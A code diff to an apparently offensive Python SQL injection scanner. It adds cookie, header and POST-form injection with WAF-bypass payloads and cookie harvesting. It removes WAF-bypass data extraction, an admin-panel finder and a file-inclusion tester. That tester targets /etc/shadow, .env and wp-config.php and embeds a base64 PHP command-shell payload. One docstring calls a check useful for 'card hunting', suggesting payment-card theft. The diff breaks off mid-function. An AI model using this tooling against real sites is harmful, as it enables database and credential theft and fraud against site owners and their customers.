+                            payload_used=payload,
+                            confidence=0.85,
+                            injection_point="cookie",
+                            cookies_extracted=jar.cookies,
+                        )
+                        if extracted.get("extracted"):
+                            result.db_version = extracted["extracted"]
+                        
+                        logger.info(f"Cookie injection SQLi! {url} cookie={cookie_name} dbms={dbms}")
+                        results.append(result)
+                        break  # Found vuln in this cookie, move to next
+                        
+                except Exception as e:
+                    logger.debug(f"Cookie injection error: {e}")
+                    continue
+        
+        return results
+
+    # ══════════════════════════ HEADER INJECTION TESTING ══════════════════════════
+
+    async def test_header_injection(self, url: str, session: aiohttp.ClientSession,
+                                     waf_name: str = None) -> List[SQLiResult]:
+        """Inject SQLi payloads into HTTP headers.
+        
+        Tests X-Forwarded-For, Referer, and other headers that
+        backend apps sometimes log/query without sanitization.
+        """
+        results = []
+        
+        injection_payloads = [
+            "' OR '1'='1",
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+            "'; WAITFOR DELAY '0:0:3'-- -",
+            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
+        ]
+        
+        for header_name in self.INJECTABLE_HEADERS:
+            for payload in injection_payloads:
+                try:
+                    test_payload = payload
+                    if waf_name:
+                        bypasses = self._apply_waf_bypass(payload, waf_name)
+                        test_payload = bypasses[0]
+                    
+                    headers = {
+                        "User-Agent": self.user_agent,
+                        header_name: test_payload,
+                    }
+                    
+                    start_t = time.time()
+                    async with self.semaphore:
+                        async with session.get(url, headers=headers, allow_redirects=True,
+                                               ssl=False, proxy=self.proxy) as resp:
+                            body = await resp.text(errors="ignore")
+                            elapsed = time.time() - start_t
+                    
+                    # Check for error-based detection
+                    dbms = self._detect_dbms(body)
+                    if dbms:
+                        result = SQLiResult(
+                            url=url,
+                            parameter=f"Header:{header_name}",
+                            vulnerable=True,
+                            injection_type="header",
+                            dbms=dbms,
+                            technique=f"Header injection ({header_name})",
+                            payload_used=test_payload,
+                            confidence=0.80,
+                            injection_point="header",
+                        )
+                        logger.info(f"Header injection SQLi! {url} header={header_name} dbms={dbms}")
+                        results.append(result)
+                        break
+                    
+                    # Check for time-based detection
+                    if "WAITFOR" in payload or "SLEEP" in payload:
+                        if elapsed >= 2.5:
+                            result = SQLiResult(
+                                url=url,
+                                parameter=f"Header:{header_name}",
+                                vulnerable=True,
+                                injection_type="header",
+                                dbms="mssql" if "WAITFOR" in payload else "mysql",
+                                technique=f"Time-based header injection ({header_name})",
+                                payload_used=test_payload,
+                                confidence=0.70,
+                                injection_point="header",
+                            )
+                            logger.info(f"Time-based header injection! {url} header={header_name}")
+                            results.append(result)
+                            break
+                        
+                except Exception as e:
+                    logger.debug(f"Header injection error: {e}")
+                    continue
+        
+        return results
+
+    # ══════════════════════════ POST PARAMETER DISCOVERY ══════════════════════════
+
+    async def discover_post_params(self, url: str, session: aiohttp.ClientSession) -> List[Dict]:
+        """Parse HTML forms and discover POST parameters for injection testing.
+        
+        Returns list of form dicts with action URL, method, and parameters.
+        """
+        forms = []
+        
+        try:
+            async with self.semaphore:
+                async with session.get(url, allow_redirects=True, ssl=False, proxy=self.proxy) as resp:
+                    body = await resp.text(errors="ignore")
+            
+            soup = BeautifulSoup(body, "html.parser")
+            
+            for form in soup.find_all("form"):
+                form_data = {
+                    "action": urljoin(url, form.get("action", url)),
+                    "method": (form.get("method", "GET")).upper(),
+                    "params": {},
+                    "hidden_params": {},
+                }
+                
+                # Collect all input fields
+                for inp in form.find_all(["input", "textarea", "select"]):
+                    name = inp.get("name")
+                    if not name:
+                        continue
+                    
+                    inp_type = inp.get("type", "text").lower()
+                    value = inp.get("value", "")
+                    
+                    if inp_type == "hidden":
+                        form_data["hidden_params"][name] = value
+                    elif inp_type not in ("submit", "button", "image", "reset", "file"):
+                        form_data["params"][name] = value
+                    
+                    # Select elements
+                    if inp.name == "select":
+                        option = inp.find("option", selected=True) or inp.find("option")
+                        if option:
+                            form_data["params"][name] = option.get("value", "")
+                
+                if form_data["params"] or form_data["hidden_params"]:
+                    forms.append(form_data)
+            
+            if forms:
+                logger.info(f"Discovered {len(forms)} forms with POST params at {url}")
+        
+        except Exception as e:
+            logger.debug(f"POST discovery error for {url}: {e}")
+        
+        return forms
+
+    async def test_post_injection(self, form: Dict, session: aiohttp.ClientSession,
+                                   waf_name: str = None) -> List[SQLiResult]:
+        """Test POST form parameters for SQL injection."""
+        results = []
+        action_url = form["action"]
+        all_params = {**form["hidden_params"], **form["params"]}
+        
+        # Prioritize params by name
+        param_names = list(form["params"].keys())
+        scored = [(n, self.PARAM_PRIORITY.get(n.lower(), 4)) for n in param_names]
+        scored.sort(key=lambda x: x[1], reverse=True)
+        ordered_params = [n for n, _ in scored]
+        
+        for param_name in ordered_params:
+            for payload in self.HEURISTIC_PAYLOADS[:4]:
+                try:
+                    test_params = all_params.copy()
+                    test_params[param_name] = str(test_params.get(param_name, "")) + payload
+                    
+                    if waf_name:
+                        bypasses = self._apply_waf_bypass(payload, waf_name)
+                        test_params[param_name] = str(all_params.get(param_name, "")) + bypasses[0]
+                    
+                    headers = {"User-Agent": self.user_agent}
+                    
+                    async with self.semaphore:
+                        if form["method"] == "POST":
+                            async with session.post(action_url, data=test_params,
+                                                    headers=headers, allow_redirects=True,
+                                                    ssl=False, proxy=self.proxy) as resp:
+                                body = await resp.text(errors="ignore")
+                        else:
+                            test_url = f"{action_url}?{urlencode(test_params)}"
+                            async with session.get(test_url, headers=headers,
+                                                   allow_redirects=True, ssl=False,
+                                                   proxy=self.proxy) as resp:
+                                body = await resp.text(errors="ignore")
+                    
+                    dbms = self._detect_dbms(body)
+                    if dbms:
+                        result = SQLiResult(
+                            url=action_url,
+                            parameter=f"POST:{param_name}",
+                            vulnerable=True,
+                            injection_type="error",
+                            dbms=dbms,
+                            technique=f"POST param injection ({form['method']})",
+                            payload_used=payload,
+                            confidence=0.85,
+                            injection_point="post",
+                        )
+                        logger.info(f"POST injection SQLi! {action_url} param={param_name} dbms={dbms}")
+                        results.append(result)
+                        break
+                
+                except Exception as e:
+                    logger.debug(f"POST injection error: {e}")
+                    continue
+        
+        return results
 
     async def _fetch(self, url: str, session: aiohttp.ClientSession) -> Tuple[str, float]:
         """Fetch a URL and return (body, response_time)."""
@@ -838,15 +1219,19 @@ class SQLiScanner:
         
         return None
 
-    async def scan(self, url: str, session: aiohttp.ClientSession = None) -> List[SQLiResult]:
+    async def scan(self, url: str, session: aiohttp.ClientSession = None,
+                   waf_name: str = None, protection_info=None) -> List[SQLiResult]:
         """Full SQL injection scan of a URL.
         
-        Tests all parameters with heuristic, error-based, union-based,
-        boolean-based, and time-based techniques.
+        Tests all parameters with smart ordering, then cookie/header/POST injection.
+        Uses WAF-specific bypass payloads when WAF is detected.
+        Detects technology to prioritize DBMS-specific payloads.
         
         Args:
             url: Target URL with parameters
             session: Optional aiohttp session
+            waf_name: Optional detected WAF name for bypass payloads
+            protection_info: Optional ProtectionInfo from WAF detector
             
         Returns:
             List of SQLiResult for each finding
@@ -862,44 +1247,73 @@ class SQLiScanner:
                 )
                 own_session = True
             
-            base, params = self._parse_url(url)
-            if not params:
-                logger.debug(f"No parameters found in URL: {url}")
-                return results
+            # Detect technology from URL/headers for DBMS prioritization
+            techs = self._detect_technology(url)
+            likely_dbms = self._get_likely_dbms(techs)
             
-            for param_name in params:
-                logger.info(f"Testing parameter '{param_name}' in {url}")
+            # Extract CMS from protection info
+            if protection_info:
+                if hasattr(protection_info, 'cms') and protection_info.cms:
+                    cms_lower = protection_info.cms.lower()
+                    if cms_lower in self.TECH_DBMS_MAP:
+                        likely_dbms = self._get_likely_dbms([cms_lower])
+                if hasattr(protection_info, 'waf') and protection_info.waf:
+                    waf_name = protection_info.waf
+            
+            base, params = self._parse_url(url)
+            
+            # ═══ 1. URL Parameter Injection (smart-ordered) ═══
+            if params:
+                ordered_params = self._prioritize_params(params)
+                logger.info(f"Testing {len(ordered_params)} params (ordered): {ordered_params}")
                 
-                # Step 1: Heuristic check
-                injectable, dbms, _ = await self.test_heuristic(url, session)
-                if not injectable:
-                    continue
-                
-                if not dbms:
-                    dbms = "mysql"  # Default assumption
-                
-                # Step 2: Error-based test
-                error_result = await self.test_error_based(url, param_name, dbms, session)
-                if error_result:
-                    results.append(error_result)
-                    continue  # Found vuln, skip other tests for this param
-                
-                # Step 3: Union-based test
-                union_result = await self.test_union_based(url, param_name, dbms, session)
-                if union_result:
-                    results.append(union_result)
-                    continue
-                
-                # Step 4: Boolean-based test
-                boolean_result = await self.test_boolean_based(url, param_name, session)
-                if boolean_result:
-                    results.append(boolean_result)
-                    continue
-                
-                # Step 5: Time-based test (last resort - slowest)
-                time_result = await self.test_time_based(url, param_name, session)
-                if time_result:
-                    results.append(time_result)
+                for param_name in ordered_params:
+                    logger.info(f"Testing parameter '{param_name}' in {url}")
+                    
+                    # Heuristic check
+                    injectable, dbms, _ = await self.test_heuristic(url, session)
+                    if not injectable:
+                        continue
+                    
+                    if not dbms:
+                        dbms = likely_dbms[0] if likely_dbms else "mysql"
+                    
+                    # Error-based test (with WAF bypass if needed)
+                    error_result = await self.test_error_based(url, param_name, dbms, session)
+                    if error_result:
+                        results.append(error_result)
+                        continue
+                    
+                    # Union-based test
+                    union_result = await self.test_union_based(url, param_name, dbms, session)
+                    if union_result:
+                        results.append(union_result)
+                        continue
+                    
+                    # Boolean-based test
+                    boolean_result = await self.test_boolean_based(url, param_name, session)
+                    if boolean_result:
+                        results.append(boolean_result)
+                        continue
+                    
+                    # Time-based test (last resort)
+                    time_result = await self.test_time_based(url, param_name, session)
+                    if time_result:
+                        results.append(time_result)
+            
+            # ═══ 2. Cookie Injection ═══
+            cookie_results = await self.test_cookie_injection(url, session, waf_name)
+            results.extend(cookie_results)
+            
+            # ═══ 3. Header Injection ═══
+            header_results = await self.test_header_injection(url, session, waf_name)
+            results.extend(header_results)
+            
+            # ═══ 4. POST Parameter Discovery & Injection ═══
+            forms = await self.discover_post_params(url, session)
+            for form in forms:
+                post_results = await self.test_post_injection(form, session, waf_name)
+                results.extend(post_results)
         
         except Exception as e:
             logger.error(f"Scan error for {url}: {e}")
@@ -909,636 +1323,12 @@ class SQLiScanner:
         
         return results
 
-    async def test_sqli_fast(self, url: str, session: aiohttp.ClientSession = None) -> bool:
-        """Quick SQLi vulnerability test.
-        
-        Does a fast heuristic check to determine if URL is likely injectable.
-        Much faster than full scan() - good for card hunting pre-check.
-        
-        Args:
-            url: Target URL with parameters
-            session: Optional aiohttp session
-            
-        Returns:
-            True if URL appears vulnerable, False otherwise
-        """
-        own_session = False
-        
-        try:
-            if session is None:
-                session = aiohttp.ClientSession(
-                    timeout=aiohttp.ClientTimeout(total=self.timeout),
-                    headers={"User-Agent": self.user_agent}
-                )
-                own_session = True
-            
-            base, params = self._parse_url(url)
-            if not params:
-                logger.debug(f"No parameters found in URL: {url}")
-                return False
-            
-            # Quick heuristic test
-            injectable, dbms, _ = await self.test_heuristic(url, session)
-            if injectable:
-                logger.info(f"✅ Fast test: {url} appears vulnerable ({dbms or 'unknown'})")
-                return True
-            
-            # Try a quick error-based test on first param
-            first_param = list(params.keys())[0]
-            test_payloads = ["'", "\"", "1'", "1\"", "1 OR 1=1", "1' OR '1'='1"]
-            
-            # Get original page to compare against (avoid matching existing text)
-            original_text = ""
-            try:
-                async with session.get(url) as orig_resp:
-                    original_text = (await orig_resp.text()).lower()
-            except:
-                pass
-            
-            # SQL error signatures — must be specific enough to avoid FPs
-            error_sigs = [
-                "you have an error in your sql syntax",
-                "mysql_fetch",
-                "mysql_num_rows",
-                "pg_query",
-                "pg_exec",
-                "syntax error at or near",
-                "unclosed quotation mark",
-                "sqlstate[",
-                "odbc sql server driver",
-                "microsoft ole db provider",
-                "ora-00933",
-                "ora-01756",
-                "ora-01747",
-                "sqlite3::",
-                "sqlite_error",
-                "fatal error</b>:  mysql",
-                "warning</b>:  mysql",
-                "warning</b>:  pg_",
-                "warning</b>:  sqlite",
-                "supplied argument is not a valid mysql",
-                "valid postgresql result",
-            ]
-            
-            for payload in test_payloads:
-                test_params = params.copy()
-                original = test_params[first_param][0] if isinstance(test_params[first_param], list) else test_params[first_param]
-                test_params[first_param] = [str(original) + payload]
-                test_url = self._build_url(base, test_params)
-                try:
-                    async with session.get(test_url) as resp:
-                        text = await resp.text()
-                        text_lower = text.lower()
-                        for sig in error_sigs:
-                            # Only flag if error appears in injected response but NOT in original
-                            if sig in text_lower and sig not in original_text:
-                                logger.info(f"✅ Fast test: {url} vulnerable (error: {sig})")
-                                return True
-                except:
-                    continue
-            
-            return False
-            
-        except Exception as e:
-            logger.error(f"Fast SQLi test error for {url}: {e}")
-            return False
-        finally:
-            if own_session and session:
-                await session.close()
-
-    async def test_waf_bypass_union(self, url: str, param_name: str, dbms: str,
-                                     session: aiohttp.ClientSession) -> Optional[SQLiResult]:
-        """Test union-based SQLi with WAF bypass obfuscation.
-        
-        Uses mixed case, inline comments, and URL encoded bypasses
-        from SQLi Dumper techniques.
-        
-        Returns:
-            SQLiResult if vulnerable, None otherwise
-        """
-        base, params = self._parse_url(url)
-        
-        # First determine column count with obfuscated ORDER BY
-        column_count = 0
-        for i in range(1, 30):
-            test_params = params.copy()
-            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-            # Obfuscated ORDER BY
-            test_params[param_name] = [f"{original}'/**/oRdEr/**/bY/**/{i}-- -"]
-            test_url = self._build_url(base, test_params)
-            
-            body, _ = await self._fetch(test_url, session)
-            if not body:
-                continue
-            
-            if any(p.search(body) for patterns in self.DBMS_ERRORS.values() for p in patterns):
-                column_count = i - 1
-                break
-        
-        if column_count < 1:
-            # Try numeric injection
-            for i in range(1, 20):
-                test_params = params.copy()
-                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-                test_params[param_name] = [f"999999.9/**/oRdEr/**/bY/**/{i}-- -"]
-                test_url = self._build_url(base, test_params)
-                
-                body, _ = await self._fetch(test_url, session)
-                if body and any(p.search(body) for patterns in self.DBMS_ERRORS.values() for p in patterns):
-                    column_count = i - 1
-                    break
-        
-        if column_count < 1:
-            return None
-        
-        logger.info(f"WAF bypass: Found {column_count} columns for {url}")
-        
-        # Build column list with markers
-        marker = f"0x{random.randint(100000, 999999):x}"
-        null_list = ["nUlL"] * column_count  # Mixed case NULL
-        injectable_cols = []
-        
-        # Try WAF bypass union payloads
-        for payload_template in self.WAF_BYPASS_UNION_PAYLOADS[:15]:
-            if "{cols_concat}" in payload_template:
-                continue  # Skip concat versions for now
-            
-            for col_idx in range(column_count):
-                test_cols = null_list.copy()
-                test_cols[col_idx] = f"cOnCaT({marker},0x7e,{marker})"
-                
-                payload = payload_template.format(cols=",".join(test_cols))
-                
-                test_params = params.copy()
-                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-                test_params[param_name] = [payload]
-                test_url = self._build_url(base, test_params)
-                
-                body, _ = await self._fetch(test_url, session)
-                if body and marker.replace("0x", "") in body:
-                    injectable_cols.append(col_idx)
-                    logger.info(f"WAF bypass: Injectable column {col_idx} found with: {payload_template[:40]}...")
-                    break
-            
-            if injectable_cols:
-                break
-        
-        if not injectable_cols:
-            return None
-        
-        result = SQLiResult(
-            url=url,
-            parameter=param_name,
-            vulnerable=True,
-            injection_type="union",
-            dbms=dbms,
-            technique="WAF Bypass UNION (SQLi Dumper)",
-            column_count=column_count,
-            injectable_columns=injectable_cols,
-            confidence=0.88,
-            payload_used=f"WAF bypass UNION with {column_count} columns"
-        )
-        
-        # Extract info using obfuscated queries
-        injectable_col = injectable_cols[0]
-        unique_start = f"0x{random.randint(100000, 999999):x}"
-        unique_end = f"0x{random.randint(100000, 999999):x}"
-        
-        # Try to get version
-        test_cols = null_list.copy()
-        test_cols[injectable_col] = f"cOnCaT({unique_start},0x7c,vErSiOn(),0x7c,{unique_end})"
-        payload = f"-1'/**/uNiOn/**/aLl/**/sElEcT/**/{','.join(test_cols)}-- -"
-        
-        test_params = params.copy()
-        test_params[param_name] = [payload]
-        test_url = self._build_url(base, test_params)
-        body, _ = await self._fetch(test_url, session)
-        
-        if body:
-            start_hex = unique_start.replace("0x", "")
-            end_hex = unique_end.replace("0x", "")
-            match = re.search(rf"{start_hex}\|(.+?)\|{end_hex}", body)
-            if match:
-                result.db_version = match.group(1)
-        
-        return result
-
-    async def test_waf_bypass_error(self, url: str, param_name: str, dbms: str,
-                                     session: aiohttp.ClientSession) -> Optional[SQLiResult]:
-        """Test error-based SQLi with WAF bypass obfuscation.
-        
-        Returns:
-            SQLiResult if vulnerable, None otherwise
-        """
-        base, params = self._parse_url(url)
-        payloads = self.WAF_BYPASS_ERROR_PAYLOADS.get(dbms, self.WAF_BYPASS_ERROR_PAYLOADS.get("mysql", []))
-        
-        for payload in payloads:
-            test_params = params.copy()
-            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-            test_params[param_name] = [str(original) + payload]
-            test_url = self._build_url(base, test_params)
-            
-            body, _ = await self._fetch(test_url, session)
-            if not body:
-                continue
-            
-            extracted = self._extract_error_data(body)
-            if extracted:
-                result = SQLiResult(
-                    url=url,
-                    parameter=param_name,
-                    vulnerable=True,
-                    injection_type="error",
-                    dbms=dbms,
-                    technique="WAF Bypass Error-based (SQLi Dumper)",
-                    payload_used=payload[:60] + "...",
-                    confidence=0.92,
-                )
-                
-                val = extracted.get("extracted", "")
-                if "version" in payload.lower():
-                    result.db_version = val
-                elif "database" in payload.lower():
-                    result.current_db = val
-                elif "user" in payload.lower():
-                    result.current_user = val
-                
-                logger.info(f"WAF bypass error-based found: {url} extracted={val}")
-                return result
-        
-        return None
-
-    async def find_admin_panels(self, base_url: str, session: aiohttp.ClientSession = None,
-                                 max_concurrent: int = 20) -> List[str]:
-        """Find admin panel paths on a target.
-        
-        Uses SQLi Dumper dictionary of 100+ admin paths.
-        
-        Args:
-            base_url: Base URL of the target (e.g., https://example.com)
-            session: Optional aiohttp session
-            max_concurrent: Max concurrent requests
-            
-        Returns:
-            List of valid admin panel URLs found
-        """
-        own_session = False
-        found_panels = []
-        
-        # Normalize base URL
-        if not base_url.startswith(('http://', 'https://')):
-            base_url = f"https://{base_url}"
-        base_url = base_url.rstrip('/')
-        
-        try:
-            if session is None:
-                session = aiohttp.ClientSession(
-                    timeout=aiohttp.ClientTimeout(total=10),
-                    headers={"User-Agent": self.user_agent}
-                )
-                own_session = True
-            
-            sem = asyncio.Semaphore(max_concurrent)
-            
-            async def check_path(path: str) -> Optional[str]:
-                async with sem:
-                    url = f"{base_url}/{path}"
-                    try:
-                        async with session.get(url, allow_redirects=False, ssl=False) as resp:
-                            if resp.status in (200, 301, 302, 303, 307, 308):
-                                # Check if it's a real admin page, not just redirect to home
-                                if resp.status == 200:
-                                    body = await resp.text(errors="ignore")
-                                    body_lower = body.lower()
-                                    # Check for admin-related keywords
-                                    admin_indicators = [
-                                        "login", "password", "username", "admin",
-                                        "sign in", "log in", "authenticate",
-                                        "dashboard", "control panel", "管理"
-                                    ]
-                                    if any(ind in body_lower for ind in admin_indicators):
-                                        logger.info(f"Admin panel found: {url}")
-                                        return url
-                                elif resp.status in (301, 302, 303, 307, 308):
-                                    # Check redirect target
-                                    location = resp.headers.get('Location', '')
-                                    if 'login' in location.lower() or 'admin' in location.lower():
-                                        logger.info(f"Admin panel redirect found: {url} -> {location}")
-                                        return url
-                    except Exception as e:
-                        logger.debug(f"Admin check failed for {url}: {e}")
-                    return None
-            
-            # Check all paths concurrently
-            tasks = [check_path(path) for path in self.ADMIN_PATHS]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            found_panels = [r for r in results if r and not isinstance(r, Exception)]
-        
-        finally:
-            if own_session and session:
-                await session.close()
-        
-        return found_panels
-
-    async def test_lfi(self, url: str, session: aiohttp.ClientSession = None,
-                       max_concurrent: int = 20) -> Dict:
-        """Test for Local/Remote File Inclusion vulnerabilities.
-        
-        Uses SQLi Dumper dic_file_dump.txt - 206 sensitive system file paths.
-        Tries various LFI techniques: direct, null byte, path traversal, wrappers.
-        
-        Args:
-            url: URL with file parameter (e.g., https://example.com/page.php?file=test)
-            session: Optional aiohttp session
-            max_concurrent: Max concurrent requests
-            
-        Returns:
-            Dict with vulnerable files and their contents
-        """
-        own_session = False
-        results = {
-            "vulnerable": False,
-            "url": url,
-            "technique": None,
-            "files_found": [],
-            "sensitive_data": []
-        }
-        
-        # LFI payloads with various techniques
-        lfi_techniques = [
-            # Direct
-            "{file}",
-            # Null byte (older PHP)
-            "{file}%00",
-            "{file}\x00",
-            # Path traversal
-            "../{file}",
-            "../../{file}",
-            "../../../{file}",
-            "../../../../{file}",
-            "../../../../../{file}",
-            "../../../../../../{file}",
-            "../../../../../../../{file}",
-            "....//....//....//....//....//....//....//..../{file}",
-            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}",
-            # PHP wrappers
-            "php://filter/read=convert.base64-encode/resource={file}",
-            "php://filter/convert.base64-encode/resource={file}",
-            # Data wrapper (RCE potential)
-            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
-            # Expect wrapper (RCE potential)
-            "expect://id",
-        ]
-        
-        # Sensitive file indicators
-        file_indicators = {
-            "/etc/passwd": ["root:", "daemon:", "nobody:", "/bin/bash", "/bin/sh"],
-            "/etc/shadow": ["root:", "$1$", "$5$", "$6$", "$y$"],
-            "/proc/self/environ": ["PATH=", "HOME=", "USER=", "SHELL="],
-            "wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix"],
-            "config.php": ["db_host", "db_user", "db_pass", "database"],
-            ".env": ["DB_PASSWORD", "APP_KEY", "SECRET", "API_KEY"],
-            ".htaccess": ["RewriteEngine", "RewriteRule", "AuthType"],
-            "php.ini": ["display_errors", "log_errors", "error_reporting"],
-            "httpd.conf": ["ServerRoot", "DocumentRoot", "VirtualHost"],
-            "my.cnf": ["mysqld", "datadir", "socket"],
-        }
-        
-        try:
-            if session is None:
-                session = aiohttp.ClientSession(
-                    timeout=aiohttp.ClientTimeout(total=10),
-                    headers={"User-Agent": self.user_agent}
-                )
-                own_session = True
-            
-            # Parse URL to find file parameter
-            base, params = self._parse_url(url)
-            file_params = ["file", "page", "include", "path", "doc", "document", 
-                          "folder", "root", "pg", "style", "pdf", "template",
-                          "php_path", "mod", "conf", "load", "read"]
-            
-            target_param = None
-            for p in file_params:
-                if p in params:
-                    target_param = p
-                    break
-            
-            if not target_param and params:
-                target_param = list(params.keys())[0]
-            
-            if not target_param:
-                return results
-            
-            sem = asyncio.Semaphore(max_concurrent)
-            
-            async def check_lfi(file_path: str, technique: str) -> Optional[Dict]:
-                async with sem:
-                    payload = technique.replace("{file}", file_path)
-                    test_params = params.copy()
-                    test_params[target_param] = [payload]
-                    test_url = self._build_url(base, test_params)
-                    
-                    try:
-                        async with session.get(test_url, allow_redirects=True, ssl=False) as resp:
-                            if resp.status == 200:
-                                body = await resp.text(errors="ignore")
-                                body_stripped = body.strip().lower()
-                                
-                                # CRITICAL: Reject HTML pages - LFI returns RAW file content
-                                # If response is an HTML document, it's NOT valid LFI
-                                is_html_page = (
-                                    body_stripped.startswith('<!doctype') or
-                                    body_stripped.startswith('<html') or
-                                    body_stripped.startswith('<?xml') or
-                                    body_stripped.startswith('<head') or
-                                    ('<html' in body_stripped[:500] and '</html>' in body_stripped[-500:]) or
-                                    ('<head>' in body_stripped[:1000] and '<body' in body_stripped[:2000])
-                                )
-                                
-                                if is_html_page:
-                                    # Only exception: if we see ACTUAL PHP source code exposed
-                                    # Real LFI of wp-config shows: <?php followed by define('DB_
-                                    has_php_source = (
-                                        "<?php" in body[:200] or  # PHP tag at start
-                                        ("define(" in body and "'DB_" in body) or  # WP config defines
-                                        ("define(" in body and "'AUTH_" in body) or  # WP auth keys
-                                        ("<?" in body[:50] and "<?xml" not in body[:50])  # Short PHP tag
-                                    )
-                                    if not has_php_source:
-                                        return None  # It's just a normal HTML page, not LFI
-                                
-                                # Check for file indicators
-                                for indicator_file, indicators in file_indicators.items():
-                                    if indicator_file in file_path or any(
-                                        ind in file_path for ind in [
-                                            "passwd", "shadow", "environ", "config", ".env", ".htaccess"
-                                        ]
-                                    ):
-                                        for ind in indicators:
-                                            if ind in body:
-                                                return {
-                                                    "file": file_path,
-                                                    "url": test_url,
-                                                    "technique": technique,
-                                                    "content_preview": body[:500],
-                                                    "indicator": ind
-                                                }
-                                
-                                # Base64 decode for PHP filter wrapper
-                                if "base64-encode" in technique and len(body) > 50:
-                                    try:
-                                        import base64
-                                        decoded = base64.b64decode(body).decode('utf-8', errors='ignore')
-                                        if any(ind in decoded for indicators in file_indicators.values() 
-                                               for ind in indicators):
-                                            return {
-                                                "file": file_path,
-                                                "url": test_url,
-                                                "technique": technique + " (base64 decoded)",
-                                                "content_preview": decoded[:500],
-                                            }
-                                    except:
-                                        pass
-                    except:
-                        pass
-                    return None
-            
-            # Test priority files first
-            priority_files = [
-                "/etc/passwd", "/etc/shadow", "/proc/self/environ",
-                "wp-config.php", "config.php", ".env", "../.env",
-                "../../wp-config.php", "../../../wp-config.php"
-            ]
-            
-            tasks = []
-            for file_path in priority_files:
-                for technique in lfi_techniques[:8]:  # Use first 8 techniques
-                    tasks.append(check_lfi(file_path, technique))
-            
-            quick_results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            for r in quick_results:
-                if r and not isinstance(r, Exception):
-                    results["vulnerable"] = True
-                    results["technique"] = r.get("technique")
-                    results["files_found"].append(r)
-                    
-                    # Extract sensitive data
-                    content = r.get("content_preview", "")
-                    if "root:" in content:
-                        results["sensitive_data"].append("Linux passwd file exposed")
-                    if "DB_PASSWORD" in content or "db_pass" in content:
-                        results["sensitive_data"].append("Database credentials exposed")
-                    if "APP_KEY" in content or "SECRET" in content:
-                        results["sensitive_data"].append("Application secrets exposed")
-            
-            # If not found, try full file list
-            if not results["vulnerable"]:
-                all_tasks = []
-                for file_path in self.LFI_PATHS[:50]:  # Test first 50 paths
-                    all_tasks.append(check_lfi(file_path, "../../../../../../..{file}"))
-                    all_tasks.append(check_lfi(file_path, "{file}"))
-                
-                full_results = await asyncio.gather(*all_tasks, return_exceptions=True)
-                
-                for r in full_results:
-                    if r and not isinstance(r, Exception):
-                        results["vulnerable"] = True
-                        results["technique"] = r.get("technique")
-                        results["files_found"].append(r)
-                        break  # Found one, that's enough
-        
-        finally:
-            if own_session and session:
-                await session.close()
-        
-        return results
-
-    async def scan_with_waf_bypass(self, url: str, session: aiohttp.ClientSession = None) -> List[SQLiResult]:
-        """Full scan with WAF bypass fallback.
-        
-        First tries standard techniques, then WAF bypass if blocked.
-        
-        Args:
-            url: Target URL with parameters
-            session: Optional aiohttp session
-            
-        Returns:
-            List of SQLiResult for each finding
-        """
-        results = []
-        own_session = False
-        
-        try:
-            if session is None:
-                session = aiohttp.ClientSession(
-                    timeout=aiohttp.ClientTimeout(total=self.timeout),
-                    headers={"User-Agent": self.user_agent}
-                )
-                own_session = True
-            
-            base, params = self._parse_url(url)
-            if not params:
-                return results
-            
-            for param_name in params:
-                logger.info(f"Testing parameter '{param_name}' with WAF bypass in {url}")
-                
-                # Heuristic check
-                injectable, dbms, _ = await self.test_heuristic(url, session)
-                if not dbms:
-                    dbms = "mysql"
-                
-                # Try standard error-based first
-                error_result = await self.test_error_based(url, param_name, dbms, session)
-                if error_result:
-                    results.append(error_result)
-                    continue
-                
-                # Try WAF bypass error-based
-                waf_error_result = await self.test_waf_bypass_error(url, param_name, dbms, session)
-                if waf_error_result:
-                    results.append(waf_error_result)
-                    continue
-                
-                # Try standard union
-                union_result = await self.test_union_based(url, param_name, dbms, session)
-                if union_result:
-                    results.append(union_result)
-                    continue
-                
-                # Try WAF bypass union
-                waf_union_result = await self.test_waf_bypass_union(url, param_name, dbms, session)
-                if waf_union_result:
-                    results.append(waf_union_result)
-                    continue
-                
-                # Boolean and time-based as last resort
-                boolean_result = await self.test_boolean_based(url, param_name, session)
-                if boolean_result:
-                    results.append(boolean_result)
-                    continue
-                
-                time_result = await self.test_time_based(url, param_name, session)
-                if time_result:
-                    results.append(time_result)
-        
-        except Exception as e:
-            logger.error(f"WAF bypass scan error for {url}: {e}")
-        finally:
-            if own_session and session:
-                await session.close()
-        
-        return results
-
-    async def batch_scan(self, urls: List[str]) -> List[SQLiResult]:
-        """Scan multiple URLs for SQL injection.
+    async def batch_scan(self, urls: List[str], waf_name: str = None) -> List[SQLiResult]:
+        """Scan multiple URLs for SQL injection with all injection points.
         
         Args:
             urls: List of target URLs
+            waf_name: Optional WAF name for bypass payloads
             
         Returns:
             Combined list of all SQLi findings
@@ -1551,7 +1341,7 @@ class SQLiScanner:
         ) as session:
             for url in urls:
                 try:
-                    results = await self.scan(url, session)
+                    results = await self.scan(url, session, waf_name=waf_name)
                     all_results.extend(results)
                     
                     # Small delay between targets
@@ -1560,3 +1350,42 @@ class SQLiScanner:
                     logger.error(f"Batch scan error for {url}: {e}")
         
         return all_results
+
+    def get_all_cookies(self) -> List[CookieJar]:
+        """Return all collected cookie jars from scanned targets."""
+        return self.collected_cookies
+
+    def get_b3_cookies(self) -> List[Dict]:
+        """Return all collected b3 tracing cookies/headers from all targets."""
+        b3_list = []
+        for jar in self.collected_cookies:
+            if jar.b3_cookies:
+                b3_list.append({
+                    "url": jar.url,
+                    "b3": jar.b3_cookies,
+                    "session_cookies": jar.session_cookies,
+                })
+            # Also check regular cookies for b3-like names
+            for name, value in jar.cookies.items():
+                if any(b3 in name.lower() for b3 in ["b3", "trace", "span"]):
+                    if not jar.b3_cookies:  # Don't double-add
+                        b3_list.append({
